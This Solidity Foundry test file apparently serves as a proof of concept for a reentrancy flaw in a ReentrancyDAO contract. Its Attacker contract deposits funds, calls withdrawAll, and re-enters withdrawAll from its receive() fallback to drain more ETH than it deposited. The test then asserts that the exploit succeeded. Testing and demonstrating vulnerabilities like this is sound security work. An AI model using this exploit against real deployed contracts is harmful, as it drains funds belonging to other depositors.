
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ReentrancyDAO} from "../src/ReentrancyDAO.sol";

contract TestReentrancyReentrancyDAO is Test {
    ReentrancyDAO public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ReentrancyDAO();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // The vulnerable function requires the attacker to have credit in the DAO
        // This is handled in setupAttack via deposit

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal - simulating other users' deposits)
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        // B. Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // C. Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ReentrancyDAO public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = ReentrancyDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the DAO to establish credit
        _victim.deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialSnapshot = address(this).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;

        // 3. Call the vulnerable function
        _victim.withdrawAll();

        // 4. Verify Success Conditions
        // If we managed to call withdrawAll multiple times via reentrancy
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
        
        // Also verify we received more than we deposited (drained extra funds)
        if (address(this).balance > initialSnapshot + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Re-enter if we haven't reached our limit and victim still has funds
        if (attackCallCount < 2 && address(_victim).balance >= storedAttackVal) {
            _victim.withdrawAll();
        }
    }
}
